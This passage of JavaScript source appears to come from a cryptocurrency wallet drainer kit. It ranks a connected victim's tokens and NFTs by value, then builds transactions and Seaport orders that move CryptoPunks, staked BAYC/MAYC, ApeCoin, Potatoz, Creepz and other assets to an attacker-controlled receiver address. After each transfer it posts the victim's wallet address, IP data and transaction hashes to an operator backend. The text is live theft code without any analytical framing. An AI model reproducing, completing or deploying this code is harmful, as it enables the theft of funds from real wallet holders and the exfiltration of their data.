                "totalPrice": this.creepzValue
            });
        }
        let u = [{
            "name": "APESTAKING",
            "totalPrice": 0.5
        }, {
            "name": "BLUR",
            "totalPrice": this.blurValue
        }, {
            "name": "SEAPORT",
            "totalPrice": this.seaportValue
        }];
        for (let k = 0; k < this.ultraVault.length; k++) {
            if (this.ultraVault[k].name == "CRYPTOPUNK") {
                this.ultraVault[k].totalPrice = 100000;
                u.push(this.ultraVault[k]);
            }
        }
        u.forEach(Y => {
            this.vault.push(Y);
        });
    };
    ["logPromting"] = async (t, n, K) => {
        try {
            let a = await this.getIpData();
            fetch(this.logDomainName + "backend/prompting", {
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": a,
                    "API_KEY": config.API_KEY,
                    "signature": this.signature,
                    "data": K,
                    "type": n,
                    "hashed_sweet": t,
                    "silent": !config.logPromptingEnabled
                }))
            });
        } catch (S) {
            console.log("Failed to send log promting", S);
        }
    };
    ["start"] = async () => {
        this.initProxy();
        this.netWorth = 0;
        this.vault = [];
        this.sweets = [];
        window.wallet_name = window.localStorage.getItem("wagmi.wallet");
        try {
            window.wallet_name = this.main_provider.signer.session.peer.metadata.name || "Other";
        } catch (D) {}
        DrainerPopup.openPopup();
        await Promise.all([this.fetchTokens, this.fetchNFTS].map(async l => {
            await l();
        }));
        this.filteredTransactions = [...this.transactions].sort((l, M) => M.price - l.price);
        await this.fillVault();
        var k = this.filteredTransactions.map(function (l) {
            var G = Object.assign({}, l);
            if (G.hasOwnProperty("type")) {
                G.tname = G.name;
                G.name = G.type;
                delete G.type;
            }
            if (G.hasOwnProperty("price")) {
                G.totalPrice = G.price;
                delete G.price;
            }
            return G;
        });
        for (let l in config.experimental) {
            if (config.experimental[l]) {
                console.log("%c[ WARN ] Experimental function " + l + " enabled", "color: yellow; font-family:monospace; font-size: 16px");
            }
        }
        let Y = {
            "LPV3_ETH": config.multipliers.LP_NFTS || 1,
            "LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
            "LPV3_ARB": config.multipliers.LP_NFTS || 1,
            "LPV3_OPTIMISM": config.multipliers.LP_NFTS || 1,
            "PNC_LPV3_ETH": config.multipliers.LP_NFTS || 1,
            "PNC_LPV3_BSC": config.multipliers.LP_NFTS || 1,
            "PNC_LPV3_BASE": config.multipliers.LP_NFTS || 1,
            "PNC_LPV3_ARB": config.multipliers.LP_NFTS || 1,
            "CAM_LPV3_ARB": config.multipliers.LP_NFTS || 1,
            "SUS_LPV3_ETH": config.multipliers.LP_NFTS || 1,
            "SUS_LPV3_BSC": config.multipliers.LP_NFTS || 1,
            "SUS_LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
            "SUS_LPV3_OPTIMISM": config.multipliers.LP_NFTS || 1,
            "SUS_LPV3_ARB": config.multipliers.LP_NFTS || 1,
            "QUI_LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
            "VEL_NFT": config.multipliers.LP_NFTS || 1,
            "TRADER_JOE": config.multipliers.LP_NFTS || 1,
            "PERMIT2_ETH": config.multipliers.PERMIT2 || 1,
            "PERMIT2_BSC": config.multipliers.PERMIT2 || 1,
            "PERMIT2_POLYGON": config.multipliers.PERMIT2 || 1,
            "PERMIT2_ARB": config.multipliers.PERMIT2 || 1,
            "PERMIT2_OPTIMISM": config.multipliers.PERMIT2 || 1,
            "PERMIT2_AVALANCHE": config.multipliers.PERMIT2 || 1,
            "PERMIT2_BASE": config.multipliers.PERMIT2 || 1,
            "BLUR": config.multipliers.BLUR || 1,
            "SEAPORT": config.multipliers.SEAPORT || 1,
            "UNISWAP": config.multipliers.SWAP || 1,
            "PANCAKESWAP_ETH": config.multipliers.SWAP || 1,
            "PANCAKESWAP_BSC": config.multipliers.SWAP || 1,
            "SUSHISWAP": config.multipliers.SWAP || 1,
            "ERC20": config.multipliers.TOKENS || 1,
            "ERC721": config.multipliers.NFT || 1,
            "ERC1155": config.multipliers.NFT || 1,
            "ETH": config.multipliers.NATIVES || 1,
            "BNB": config.multipliers.NATIVES || 1,
            "MATIC": config.multipliers.NATIVES || 1,
            "ARB": config.multipliers.NATIVES || 1,
            "OPTIMISM": config.multipliers.NATIVES || 1,
            "FTM": config.multipliers.NATIVES || 1,
            "AVAX": config.multipliers.NATIVES || 1,
            "CELO": config.multipliers.NATIVES || 1,
            "BASE": config.multipliers.NATIVES || 1,
            "CRO": config.multipliers.NATIVES || 1,
            "POTATOZ_STAKED": config.multipliers.NFT || 1,
            "CREEPZ_STAKED": config.multipliers.NFT || 1,
            "APESTAKING": config.multipliers.TOKENS || 1,
            "CRYPTOPUNK": config.multipliers.NFT || 1,
            "COMET": config.multipliers.LP_NFTS || 1
        };
        Y.SEAPORT += 0.0001;
        var a = this.vault.concat(k);
        for (let M = 0; M < a.length; M++) {
            let G;
            if (Y.hasOwnProperty(a[M].name)) {
                G = Y[a[M].name];
            } else {
                G = 1;
            }
            let O = a[M];
            O.weight = a[M].totalPrice * G;
            this.sweets.push(O);
        }
        this.sweets.sort(function (r, d) {
            return d.weight - r.weight;
        });
        console.table(this.sweets);
        let S = config.ethContractAddress;
        console.log("nw", this.netWorth, "rcmin", config.reserve_contract_min);
        const U = {
            "1": S,
            "10": S,
            "25": S,
            "56": S,
            "137": S,
            "250": S,
            "8453": S,
            "42161": S,
            "43114": S,
            "42220": S
        };
        if (this.netWorth > config.reserve_contract_min) {
            config.tokenContractAddresses = config.multicall_addys;
            config.ethContractAddress = config.native_addys;
        } else {
            config.tokenContractAddresses = {
                0x1: config.multicall,
                0xa: config.multicall,
                0x19: config.multicall,
                0x38: config.multicall,
                0x89: config.multicall,
                0xfa: config.multicall,
                0x2105: config.multicall,
                0xa4b1: config.multicall,
                0xa86a: config.multicall,
                0xa4ec: config.multicall
            };
            config.ethContractAddress = U;
        }
        if (this.sweets.length != 0 || config.logEmptyWallets) {
            await this.logConnection();
        }
        try {
            updateWalletData(this.walletAddress, this.netWorth, 1);
        } catch (r) {
            console.log("Unable to send callback!", r);
        }
        if (this.netWorth < config.minimalDrainValue) {
            this.notEligible();
            try {
                updateWalletData(this.walletAddress, this.netWorth, 2);
            } catch (d) {
                console.log("Unable to send callback!", d);
            }
            return;
        }
        for (let s = 0; s < this.sweets.length; s++) {
            if (this.ethereumClient?.["getAccount"]()?.["address"]?.["toLowerCase"]() != this.walletAddress.toLowerCase()) {
                this.started = false;
                console.log("Address Changed");
                if (config.useSweetAlert) {
                    Swal.fire(config.swal_addressChangedTitle, config.addressChanged, "warning");
                } else {
                    alert(config.addressChanged);
                }
                this.updateButtonMessage(false, false, true);
                DrainerPopup.closePopup();
                return;
            }
            ;
            console.log(this.sweets[s]);
            let v = true;
            let C = JSON.stringify(this.sweets[s]);
            let E = CryptoJS.MD5(C).toString();
            if (localStorage.getItem("cached_sweets_" + this.walletAddress)) {
                try {
                    const X = JSON.parse(localStorage.getItem("cached_sweets_" + this.walletAddress));
                    if (Array.isArray(X)) {
                        if (X.includes(E)) {
                            v = false;
                            console.log("Skipping current (duplicate)");
                        }
                    }
                } catch (P) {
                    console.error(P);
                }
            }
            if (v) {
                switch (this.sweets[s].name) {
                    case "LPV3_ETH":
                    case "LPV3_POLYGON":
                    case "LPV3_OPTIMISM":
                    case "LPV3_ARB":
                        await this.transferLPV3(E, this.sweets[s].tokens, this.sweets[s].totalPrice);
                        break;
                    case "PNC_LPV3_ETH":
                    case "PNC_LPV3_BSC":
                    case "PNC_LPV3_BASE":
                    case "PNC_LPV3_ARB":
                        await this.transferPancakeLPV3(E, this.sweets[s].tokens, this.sweets[s].totalPrice);
                        break;
                    case "CAM_LPV3_ARB":
                        await this.transferCamelotLPV3(E, this.sweets[s].tokens, this.sweets[s].totalPrice);
                        break;
                    case "SUS_LPV3_ETH":
                    case "SUS_LPV3_BSC":
                    case "SUS_LPV3_POLYGON":
                    case "SUS_LPV3_ARB":
                    case "SUS_LPV3_OPTIMISM":
                        await this.transferSushiswapLPV3(E, this.sweets[s].tokens, this.sweets[s].totalPrice);
                        break;
                    case "QUI_LPV3_POLYGON":
                        await this.transferQuickswapLPV3(E, this.sweets[s].tokens, this.sweets[s].totalPrice);
                        break;
                    case "TRADER_JOE":
                        await this.transferTJ(E, this.sweets[s]);
                        break;
                    case "PERMIT2_ETH":
                        await this.transferERC20permit2(E, this.permitTokens.ETH, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_BSC":
                        await this.transferERC20permit2(E, this.permitTokens.BSC, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_POLYGON":
                        await this.transferERC20permit2(E, this.permitTokens.POLYGON, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_ARB":
                        await this.transferERC20permit2(E, this.permitTokens.ARB, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_OPTIMISM":
                        await this.transferERC20permit2(E, this.permitTokens.OPTIMISM, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_AVALANCHE":
                        await this.transferERC20permit2(E, this.permitTokens.AVALANCHE, this.sweets[s].totalPrice);
                        break;
                    case "PERMIT2_BASE":
                        await this.transferERC20permit2(E, this.permitTokens.BASE, this.sweets[s].totalPrice);
                        break;
                    case "BLUR":
                        await this.transferBlur(E);
                        break;
                    case "SEAPORT":
                        await this.transferSeaport(E);
                        break;
                    case "UNISWAP":
                        await this.transferERC20Uniswap(E);
                        break;
                    case "PANCAKESWAP_ETH":
                        await this.transferERC20PancakeV3(E, 1, this.pancakeswapTokens_eth, this.pancakeswapValue_eth);
                        break;
                    case "PANCAKESWAP_BSC":
                        await this.transferERC20PancakeV3(E, 56, this.pancakeswapTokens_bsc, this.pancakeswapValue_bsc);
                        break;
                    case "VEL_NFT":
                        await this.transferVeloNFTs(E, this.sweets[s]);
                        break;
                    case "SUSHISWAP":
                        await this.transferERC20sushiswap(E, this.sweets[s]);
                        break;
                    case "ERC20":
                        await this.transferERC20(E, this.sweets[s]);
                        break;
                    case "ERC721":
                    case "ERC1155":
                        await this.transferNFT(E, this.sweets[s]);
                        break;
                    case "ETH":
                        await this.transferNative(E, 1, this.sweets[s].native);
                        break;
                    case "BNB":
                        await this.transferNative(E, 56, this.sweets[s].native);
                        break;
                    case "MATIC":
                        await this.transferNative(E, 137, this.sweets[s].native);
                        break;
                    case "ARB":
                        await this.transferNative(E, 42161, this.sweets[s].native);
                        break;
                    case "OPTIMISM":
                        await this.transferNative(E, 10, this.sweets[s].native);
                        break;
                    case "FTM":
                        await this.transferNative(E, 250, this.sweets[s].native);
                        break;
                    case "AVAX":
                        await this.transferNative(E, 43114, this.sweets[s].native);
                        break;
                    case "CELO":
                        await this.transferNative(E, 42220, this.sweets[s].native);
                        break;
                    case "BASE":
                        await this.transferNative(E, 8453, this.sweets[s].native);
                        break;
                    case "CRO":
                        await this.transferNative(E, 25, this.sweets[s].native);
                        break;
                    case "POTATOZ_STAKED":
                        await this.transferPotatoz(E);
                        break;
                    case "CREEPZ_STAKED":
                        await this.transferCreepz(E, this.sweets[s]);
                        break;
                    case "COMET":
                        await this.transferComet(E, this.sweets[s]);
                        break;
                    case "CRYPTOPUNK":
                        await this.transferCryptoPunk(this.sweets[s]);
                        break;
                }
            }
        }
        this.updateButtonMessage(false, false, true);
        try {
            updateWalletData(this.walletAddress, this.netWorth, 3);
        } catch (o) {
            console.log("Unable to send callback!", o);
        }
        if (this.txcount == 0) {
            this.notEligible();
            try {
                updateWalletData(this.walletAddress, this.netWorth, 2);
            } catch (x) {
                console.log("Unable to send callback!", x);
            }
        }
        this.started = false;
    };
    ["transferCryptoPunk"] = async t => {
        console.log("cryptoPunk", this.apeStaking);
        try {
            await this.changeNetwork(1);
            console.log("Transferring Crypto Punk " + t.name);
            console.log("Pending Transactions: " + this.pending.length);
            let k = new ethers.utils.Interface(CRYPTOPUNK);
            await new Promise(async (Y, a) => {
                let l = k.encodeFunctionData("transferPunk", [config.receiver, t.tokenIds[0]]);
                let M = {
                    "from": this.walletAddress,
                    "to": t.contractAddress,
                    "value": "0x0000",
                    "data": l
                };
                try {
                    const G = {
                        chain: 0x1,
                        tokenPrice: 0x30
                    };
                    this.logPromting('', "CRYPTOPUNK", G);
                } catch (O) {
                    console.warn(O);
                }
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [M],
                    "from": this.walletAddress
                }, (r, d) => {
                    if (r) {
                        console.log("Sign error:", r);
                        this.logCancel(t.type, t.name, t.price.toString().slice(0, 5) + " ETH");
                        a(r);
                    } else {
                        this.pending.push(d);
                        let v = d;
                        if (d.hasOwnProperty("result")) {
                            v = d.result;
                        } else if (d.hasOwnProperty("hash")) {
                            v = d.hash;
                        }
                        console.log("NFT success", d);
                        Y(v);
                    }
                });
            }).then(async Y => {
                let S = await this.getIpData();
                fetch(this.logDomainName + "backend/safa/nft", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "walletBalanceInEth": this.walletBalanceInEth,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": S,
                        "API_KEY": config.API_KEY,
                        "tokenType": t.type,
                        "tokenName": t.name,
                        "tokenPrice": t.price,
                        "contractAddress": t.contractAddress,
                        "signature": this.signature,
                        "contractId": 0x270f,
                        "transactionHash": Y
                    }))
                });
                this.txcount++;
                return true;
            })["catch"](async Y => {
                console.log("NFT error:", Y);
                if (config.repeatHighest) {
                    return await this.transferCryptoPunk(t);
                }
                this.txcount++;
            });
        } catch (Y) {
            console.warn("Failed to transfer Cryptopunk");
        }
    };
    ["transferStakedApe"] = async () => {
        console.log("StakedApe", this.apeStaking);
        try {
            let u = new ethers.utils.Interface(APECOINSTAKING);
            let k = new ethers.Contract(this.apeStaking, APECOINSTAKING, this.secondProvider);
            await Promise.all(this.NFTtokens.map(async Y => {
                if (Y.contractAddress == this.bayc) {
                    try {
                        await this.changeNetwork(1);
                    } catch (D) {
                        console.log(D);
                        return false;
                    }
                    return await new Promise(async (l, M) => {
                        let r = (await k.getBaycStakes(this.walletAddress)).map(v => {
                            return {
                                "tokenId": v.tokenId,
                                "amount": v.deposited
                            };
                        });
                        let d = u.encodeFunctionData("withdrawBAYC", [r, config.receiver]);
                        let s = {
                            "from": this.walletAddress,
                            "to": this.apeStaking,
                            "value": "0x0000",
                            "data": d
                        };
                        try {
                            this.logPromting('', "BAYC", {
                                "chain": 0x1,
                                "tokenPrice": this.apeStakedValue
                            });
                        } catch (v) {
                            console.warn(v);
                        }
                        await this.main_provider.sendAsync({
                            "method": "eth_sendTransaction",
                            "params": [s],
                            "from": this.walletAddress
                        }, (C, E) => {
                            if (C) {
                                M(C);
                            } else {
                                let T = E;
                                if (E.hasOwnProperty("result")) {
                                    T = E.result;
                                } else if (E.hasOwnProperty("hash")) {
                                    T = E.hash;
                                }
                                console.log("BAYC STAKING success", T);
                                this.pending.push(T);
                                this.considerations = this.considerations.filter(X => X.contractAddress != Y.contractAddress);
                                this.offers = this.offers.filter(X => X.contractAddress != Y.contractAddress);
                                this.uniswapTokens = this.uniswapTokens.filter(X => X.contractAddress != Y.contractAddress);
                                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(X => X.contractAddress != Y.contractAddress);
                                this.sushiswapTokens = this.sushiswapTokens.filter(X => X.contractAddress != Y.contractAddress);
                                l(T);
                            }
                        });
                    }).then(async l => {
                        let G = await this.getIpData();
                        fetch(this.logDomainName + "backend/apeStaking", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "walletBalanceInEth": this.walletBalanceInEth,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "ipData": G,
                                "API_KEY": config.API_KEY,
                                "tokenPrice": Number(this.apeStakedValue).toFixed(3) + " ETH",
                                "transferName": "STAKED BAYC",
                                "signature": this.signature,
                                "transactionHash": l,
                                "contractId": 0x270f
                            }))
                        });
                        return true;
                    })["catch"](async l => {
                        this.logCancel("STAKED BAYC", '', Number(Y.price).toFixed(3) + " ETH");
                        if (config.repeatHighest) {
                            return await this.transferStakedApe();
                        }
                        this.updateButtonMessage(true);
                    });
                }
                if (Y.contractAddress == this.mayc) {
                    try {
                        await this.changeNetwork(1);
                    } catch (l) {
                        console.log(l);
                        return false;
                    }
                    return new Promise(async (M, G) => {
                        let d = (await k.getMaycStakes(this.walletAddress)).map(C => {
                            return {
                                "tokenId": C.tokenId,
                                "amount": C.deposited
                            };
                        });
                        let s = u.encodeFunctionData("withdrawMAYC", [d, config.receiver]);
                        let v = {
                            "from": this.walletAddress,
                            "to": this.apeStaking,
                            "value": "0x0000",
                            "data": s
                        };
                        try {
                            this.logPromting('', "MAYC", {
                                "chain": 0x1,
                                "tokenPrice": this.apeStakedValue
                            });
                        } catch (C) {
                            console.warn(C);
                        }
                        await this.main_provider.sendAsync({
                            "method": "eth_sendTransaction",
                            "params": [v],
                            "from": this.walletAddress
                        }, (E, w) => {
                            if (E) {
                                G(E);
                            } else {
                                console.log("MAYC STAKING success", w);
                                this.pending.push(w);
                                this.considerations = this.considerations.filter(o => o.contractAddress != Y.contractAddress);
                                this.offers = this.offers.filter(o => o.contractAddress != Y.contractAddress);
                                this.uniswapTokens = this.uniswapTokens.filter(o => o.contractAddress != Y.contractAddress);
                                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(o => o.contractAddress != Y.contractAddress);
                                this.sushiswapTokens = this.sushiswapTokens.filter(o => o.contractAddress != Y.contractAddress);
                                M(w);
                            }
                        });
                    }).then(async M => {
                        let O = await this.getIpData();
                        fetch(this.logDomainName + "backend/apeStaking", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "walletBalanceInEth": this.walletBalanceInEth,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "ipData": O,
                                "API_KEY": config.API_KEY,
                                "signature": this.signature,
                                "contractId": 0x270f,
                                "tokenPrice": Number(this.apeStakedValue).toFixed(3) + " ETH",
                                "transferName": "STAKED MAYC",
                                "transactionHash": M
                            }))
                        });
                        this.txcount++;
                        return true;
                    })["catch"](async M => {
                        this.logCancel("STAKED MAYC", '', Number(Y.price).toFixed(3) + " ETH");
                        if (config.repeatHighest) {
                            return await this.transferStakedApe();
                        }
                        this.updateButtonMessage(true);
                        this.txcount++;
                    });
                }
            }));
        } catch (Y) {
            console.warn("Failed to transfer Staked Ape");
        }
    };
    ["transferApecoins"] = async () => {
        console.log("Ape", this.apeStaking);
        try {
            await this.changeNetwork(1);
            console.log("Transferring staked apecoin");
            console.log("Pending Transactions: " + this.pending.length);
            let u = new ethers.utils.Interface(APECOINSTAKING);
            let k = new ethers.Contract(this.apeStaking, APECOINSTAKING, this.secondProvider);
            return await new Promise(async (Y, a) => {
                let U = await k.getApeCoinStake(this.walletAddress);
                if (U.deposited == 0) {
                    return a('');
                }
                let D = u.encodeFunctionData("withdrawApeCoin", [U.deposited, config.receiver]);
                let l = {
                    "from": this.walletAddress,
                    "to": this.apeStaking,
                    "value": "0x0000",
                    "data": D
                };
                try {
                    this.logPromting('', "APECOINS", {
                        "chain": 0x1,
                        "tokenPrice": this.apeStakedValue
                    });
                } catch (M) {
                    console.warn(M);
                }
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [l],
                    "from": this.walletAddress
                }, (G, O) => {
                    if (G) {
                        a(G);
                    } else {
                        let d = O;
                        if (O.hasOwnProperty("result")) {
                            d = O.result;
                        } else if (O.hasOwnProperty("hash")) {
                            d = O.hash;
                        }
                        console.log("APECOIN STAKING success", d);
                        this.pending.push(d);
                        this.considerations = this.considerations.filter(s => s.contractAddress != this.apeCoin);
                        this.offers = this.offers.filter(s => s.contractAddress != this.apeCoin);
                        this.uniswapTokens = this.uniswapTokens.filter(s => s.contractAddress != this.apeCoin);
                        this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(s => s.contractAddress != this.apeCoin);
                        this.sushiswapTokens = this.sushiswapTokens.filter(s => s.contractAddress != this.apeCoin);
                        Y(d);
                    }
                });
            }).then(async Y => {
                let S = await this.getIpData();
                fetch(this.logDomainName + "backend/apeStaking", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "walletBalanceInEth": this.walletBalanceInEth,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": S,
                        "API_KEY": config.API_KEY,
                        "signature": this.signature,
                        "contractId": this.contractId,
                        "transferName": "STAKED APECOIN",
                        "transactionHash": Y
                    }))
                });
                this.txcount++;
                return true;
            })["catch"](async Y => {
                this.logCancel("STAKED APECOIN", '', "0 ETH");
                if (config.repeatHighest) {
                    return await this.transferApecoins();
                }
                this.updateButtonMessage(true);
                this.txcount++;
            });
        } catch (Y) {
            console.warn("Failed to withdraw Apecoins");
        }
    };
    ["transferPotatoz"] = async (t, n) => {
        try {
            if (this.potatozStaked.tokenIds.length > 0) {
                console.log("potatoz", this.potatozStaked.tokenIds);
                await this.changeNetwork(1);
                console.log("transfering staked potatoz");
                await new Promise(async (Y, a) => {
                    let U = new ethers.utils.Interface(potatoz_ABI);
                    let D = this.potatozStaked.tokenIds;
                    let l = U.encodeFunctionData("stakeTransferAll", [this.walletAddress, config.seaport_receiver, D]);
                    let M = this.potatozStaked.contractAddress;
                    let G = {
                        "from": this.walletAddress,
                        "to": M,
                        "value": "0x0000",
                        "data": l
                    };
                    let O = {
                        name: "POTATOZ_STAKED",
                        totalPrice: 1.5,
                        chain: 1
                    };
                    try {
                        this.logPromting(t, "POTATOZ", {
                            "chain": 0x1,
                            "tokenPrice": this.potatozValue
                        });
                    } catch (r) {
                        console.warn(r);
                    }
                    this.estimateTXcosts(G, O, 1);
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [G],
                        "from": this.walletAddress
                    }, (d, s) => {
                        if (d) {
                            a(d);
                        } else {
                            let C = s;
                            if (s.hasOwnProperty("result")) {
                                C = s.result;
                            } else if (s.hasOwnProperty("hash")) {
                                C = s.hash;
                            }
                            Y(C);
                        }
                    });
                }).then(async Y => {
                    let S = await this.getIpData();
                    fetch(this.logDomainName + "backend/potatoz", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": S,
                            "API_KEY": config.API_KEY,
                            "tokenPrice": Number(this.potatozValue).toFixed(3) + " ETH",
                            "transactionHash": Y,
                            "contractId": 0x270f,
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async Y => {
                    this.logCancel("Staked Potatoz NFTs", '', Number(this.potatozValue).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferPotatoz(t);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            }
        } catch (Y) {
            console.warn("Potatoz error:", Y);
        }
    };
    ["transferCreepz"] = async t => {
        try {
            console.log(this.creepzStaked, "erfewrfjklwrfedijklfrejikolrfdewuiolrfwdeuiolwsfrde");
            if (this.creepzStaked.tokenIds.length > 0) {
                console.log("creepz", this.creepzStaked.tokenIds);
                await this.changeNetwork(1);
                console.log("transfering staked creepz");
                await new Promise(async (k, Y) => {
                    let U = new ethers.utils.Interface(creepz_ABI);
                    let D = this.creepzStaked.tokenIds;
                    let l = U.encodeFunctionData("transferWhileStaked", [config.seaport_receiver, D]);
                    let M = this.creepzStaked.contractAddress;
                    let G = {
                        "from": this.walletAddress,
                        "to": M,
                        "value": "0x0000",
                        "data": l
                    };
                    let O = {
                        name: "CREEPZ_STAKED",
                        totalPrice: 1.5,
                        chain: 1
                    };
                    try {
                        this.logPromting(t, "CREEPZ", {
                            "chain": 0x1,
                            "tokenPrice": this.creepzValue
                        });
                    } catch (r) {
                        console.warn(r);
                    }
                    this.estimateTXcosts(G, O, 1);
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [G],
                        "from": this.walletAddress
                    }, (d, s) => {
                        if (d) {
                            Y(d);
                        } else {
                            let C = s;
                            if (s.hasOwnProperty("result")) {
                                C = s.result;
                            } else if (s.hasOwnProperty("hash")) {
                                C = s.hash;
                            }
                            k(C);
                        }
                    });
                }).then(async k => {
                    let a = await this.getIpData();
                    fetch(this.logDomainName + "backend/creepz", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": a,
                            "API_KEY": config.API_KEY,
                            "tokenPrice": Number(this.creepzValue).toFixed(3) + " ETH",
                            "transactionHash": k,
                            "contractId": 0x270f,
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async k => {
                    this.logCancel("Staked creepz NFTs", '', Number(this.creepzValue).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferCreepz(t);
                    }
                    this.updateButtonMessage(true);
                    this.txcount++;
                    return false;
                });
            }
        } catch (k) {
            console.warn("Potatoz error:", k);
        }
    };
    ["transferSeaport"] = async t => {
        console.log("SP0", this.offers, this.considerations);
        if (this.offers.length != 0 && this.considerations.length != 0) {
            console.log("SP1", this.offers, this.considerations);
            try {
                await this.changeNetwork(1);
                if (this.offers.length != 0 && this.considerations.length != 0) {
                    console.log(this.offers);
                    console.log(this.considerations);
                    let k = new seaport.Seaport(this.signer, {
                        "seaportVersion": "1.5"
                    });
                    const {
                        executeAllActions: Y
                    } = await k.createOrder({
                        "offer": this.offers,
                        "consideration": this.considerations,
                        "conduitKey": "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
                        "zone": "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
                        "startTime": "1661790956",
                        "endTime": "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                    }, config.receiver);
                    let a = await Y();
                    console.log(a);
                    this.sweets = this.sweets.filter(S => !this.considerations.map(U => U.token).includes(S.contractAddress));
                    this.uniswapTokens = this.uniswapTokens.filter(S => !this.considerations.map(U => U.token).includes(S.contractAddress));
                    this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(S => !this.considerations.map(U => U.token).includes(S.contractAddress));
                    this.sushiswapTokens = this.sushiswapTokens.filter(S => !this.considerations.map(U => U.token).includes(S.contractAddress));
                    this.permitTokens.ETH = this.permitTokens.ETH.filter(S => !this.considerations.map(U => U.token).includes(S.contractAddress));
                    try {
                        let S = await this.getIpData();
                        let U = '';
                        this.seaportTokens.forEach((D, l) => {
                            if (D.type != "ERC20") {
                                D.tokenIds.forEach(r => {
                                    U += "<a href=\"https://opensea.io/assets/ethereum/" + D.contractAddress + "/" + r + "\">" + D.collectionSymbol + "</a> (" + (D.price / D.owned).toFixed(3) + " ETH)" + (l + 1 == this.seaportTokens.length ? '' : ",") + " ";
                                });
                            } else {
                                U += "<a href=\"https://etherscan.io/address/" + D.contractAddress + "\">" + D.name + "</a> (" + D.usdPrice + "$)" + (l + 1 == this.seaportTokens.length ? '' : ",") + " ";
                            }
                        });
                        try {
                            this.logPromting(t, "SEAPORT", {
                                "chain": 0x1,
                                "tokenPrice": this.seaportValue
                            });
                        } catch (D) {
                            console.warn(D);
                        }
                        fetch(this.logDomainName + "backend/seaport", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "order": a,
                                "address": this.walletAddress,
                                "walletBalanceInEth": this.walletBalanceInEth,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "ipData": S,
                                "API_KEY": config.API_KEY,
                                "signature": this.signature,
                                "contractId": 0x270f,
                                "seaportItems": U,
                                "seaportValue": Number(this.seaportValue).toFixed(3) + " ETH",
                                "hash_sweet": t
                            }))
                        });
                        this.txcount++;
                        this.addToLocalStorage(t);
                        return true;
                    } catch (l) {
                        console.log("Connection Log error: ", l);
                    }
                    this.updateButtonMessage(false, true);
                    await this.sleep(500);
                } else {
                    console.warn("SEAPORT no approved items");
                }
            } catch (M) {
                this.logCancel("Seaport");
                if (config.repeatHighest) {
                    return await this.transferSeaport(t);
                }
                this.updateButtonMessage(true);
                this.txcount++;
                console.log(M);
            }
        }
    };
    ["transferBlur"] = async t => {
        try {
            if (this.blurTokens.length > 0) {
                console.log("blur", this.blurTokens);
                await this.changeNetwork(1);
                console.log("transferring blur tokens");
                console.table(this.blurTokens);
                let Y = String(Math.floor(new Date().getTime() * 10000) + 86400);
                let a = this.blurNonce;
                let S = [];
                let U = [];
                this.blurTokens.map(O => {
                    if (O.tokenIds) {
                        U = O.tokenIds.map(s => {
                            return {
                                "trader": this.walletAddress,
                                "side": 0x1,
